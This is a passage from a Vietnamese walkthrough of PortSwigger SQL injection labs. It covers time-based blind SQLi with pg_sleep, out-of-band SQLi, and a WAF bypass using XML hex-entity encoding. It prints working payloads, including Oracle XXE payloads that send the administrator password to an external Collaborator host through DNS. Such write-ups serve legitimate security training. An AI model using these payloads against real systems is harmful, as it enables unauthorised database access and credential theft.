>`'|| CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='administrator')=§§) THEN '' ELSE pg_sleep(10) END--` 
>Trong đó `§§` chạy từ 1 -> 30: 
>![image](https://hackmd.io/_uploads/H197ZdLlC.png)

>Nhận thấy khi payload = 20 thì thời gian phản hồi ít nhất => Mật khẩu có độ dài 20 kí tự. Tiếp tục sử dụng SUBSTRING để đoán từng kí tự trong mật khẩu: 
>`'|| CASE WHEN ((SELECT SUBSTRING(password, §§, 1) FROM users WHERE username='administrator')='§§') THEN '' ELSE pg_sleep(4) END--`

>Cài đặt tham số cho 2 payload: 
>![image](https://hackmd.io/_uploads/HyjxXdLx0.png) 
>và
> ![image](https://hackmd.io/_uploads/ryMfmu8xC.png)

>Attack xong, lọc theo `Respone received` để lấy 20 request có thời gian phản hồi nhanh nhất: ![image](https://hackmd.io/_uploads/BywDYOLgC.png)

>Sắp xếp lại theo thứ tự để được mật khẩu: ![image](https://hackmd.io/_uploads/BJ_tFdIe0.png)

>Login thành công và solved bài lab: ![image](https://hackmd.io/_uploads/BJxituLeC.png)

# **16. Lab: Blind SQL injection with out-of-band interaction**
> Bài lab tiếp tục khai thác lỗ hổng SQLi tại trường `TrackingID` tại Cookie. Cho biết truy vấn SQL được thực thi không đồng bộ và không ảnh hưởng đến phản hồi của ứng dụng. Tuy nhiên thì ta có thể làm cho nó tương tác với external domain. Đây là lỗ hổng thuộc dạng Out-of-band SQLi. Để giải quyết bài lab, khai thác lỗ hổng SQL để thực hiện tra cứu DNS trong Burp Collaborator.
![image](https://hackmd.io/_uploads/ryX69dLxC.png)

> Đầu tiên, phải xác định hệ cơ sở dữ liệu mà server sử dụng bằng cách tra cheat-sheet: ![image](https://hackmd.io/_uploads/HyA7l1veC.png)

> Vào Burp Collaborator và lấy subdomain: ![image](https://hackmd.io/_uploads/SJ8Rl1DlC.png)

> Cho request chứa `Tracking Cookie` vào Repeater và thay từng payload ứng với các hệ cơ sở dữ liệu tương ứng, mục tiêu sẽ là tạo ra cac DNS lookup query đến external domain.

>Sau khi thử payload của Oracle thì bên phía Collaborator đã nhận được các DNS Query: 
> `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://nsjtiuq949f56qkgybmpwlcublhc51.oastify.com/"> %remote;]>'),'/l') FROM dual--`
> **Lưu ý:** chuyển payload về dạng URL encode trước khi Send bằng cách Ctrl U. 
> ![image](https://hackmd.io/_uploads/Skoo7yPeC.png)

>Bên phía Collab:![image](https://hackmd.io/_uploads/BkOT7JPlA.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/HJeJ4JvgA.png)

# **17. Lab: Blind SQL injection with out-of-band data exfiltration**
>Bài lab này cũng như bài trước, thực hiện DNS Lookup cho Burp Collaborator để khai thác Out-of-band SQLi. Nhiệm vụ của ta là phải lấy được `password` của `administrator` và login để hoàn thành bài lab: 
![image](https://hackmd.io/_uploads/HJScNJvxR.png)

> Với payload như bài trước:
> `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://0fg1htzkqjtmnzpj612ah2cneek68v.oastify.com/"> %remote;]>'),'/l') FROM dual--`
> 
> Bây giờ ta cần thêm lệnh để có thể lấy `password` trong bảng `users` của `administrator` : 
> `select password from users where username='administrator`

>Ghép thành payload mới cho bài này:
>`' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.0fg1htzkqjtmnzpj612ah2cneek68v.oastify.com/"> %remote;]>'),'/l') FROM dual--` 
![image](https://hackmd.io/_uploads/HkdPY1PgC.png)


>Gửi request và kiểm tra Burp Collaborator thì thấy các DNS query đã được gửi đến kèm theo `password` của `administrator` là: **np0y4bf91o8xhohj2zse**
![image](https://hackmd.io/_uploads/HkXmtkvg0.png)

>Login và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/HyucKyDlA.png)

# **18. Lab: SQL injection with filter bypass via XML encoding**
>Nhiệm vụ của chúng ta là tìm được tài khoản và mật khẩu của admin trong bảng users để hoàn thành bài lab: 
![image](https://hackmd.io/_uploads/rJB_qyweR.png)

> Lỗ hổng SQLi trong bài này xảy ra ở phần kiểm tra số lượng hàng còn lại của sản phẩm: ![image](https://hackmd.io/_uploads/B1sen1wlC.png)

>Khi Check Stock thì, nó sẽ gửi 1 request để truy vấn số sản phẩm còn lại trong db. Trong đó, request với method POST được gửi với phần body dạng XML chứa 2 trường `productID` và `storeID`: 
>![image](https://hackmd.io/_uploads/SkzxpkDx0.png)

>Thêm thử vào `storeID` 1 phép toán khác, ví dụ như `1=2` thì vẫn thấy kết quả trả về đúng với kết quả khác ban đầu: ![image](https://hackmd.io/_uploads/H1eFpJveC.png)

>Tiếp tục thử `' OR 1=1--` thì bị WAF chặn lại: ![image](https://hackmd.io/_uploads/BkYT6kweA.png)

>Ta sẽ sử dụng cách encode HTML thành dạng hex entities đối với cả payload trên. (Vào Extension và cài đặt Hackvertor): ![image](https://hackmd.io/_uploads/Syb31gvgC.png)

>Sau khi chuyển về dạng hex entities thì ta đã có thể bypass được WAF, sau đó tìm số cột mà dữ liệu trả về: ![image](https://hackmd.io/_uploads/By-Xeewx0.png)

>Thử với số cột bằng 1 thìtthấy trả về kết quả là `null` => dữ liệu trả về gồm 1 cột. Bây giờ, ta chỉ việc lấy `username` và `password` từ bảng users theo cách tấn công UNION thông thường: ![image](https://hackmd.io/_uploads/SJOFglwlR.png)

>Truy vấn để lấy mật khẩu: ![image](https://hackmd.io/_uploads/Hk3slePlC.png)

>Cuối cùng là login vào `administrator` và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/rJVMbxPxR.png)
